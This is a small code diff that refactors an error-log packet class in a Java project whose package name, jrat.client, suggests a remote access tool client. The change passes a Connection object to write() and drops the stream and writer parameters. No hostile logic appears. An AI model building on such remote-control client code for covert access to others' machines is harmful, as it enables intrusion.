@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet65ErrorLog extends AbstractOutgoingPacket {
@@ -13,8 +12,8 @@ public class Packet65ErrorLog extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(error);
+	public void write(Connection dos) throws Exception {
+		dos.writeLine(error);
 	}
 
 	@Override
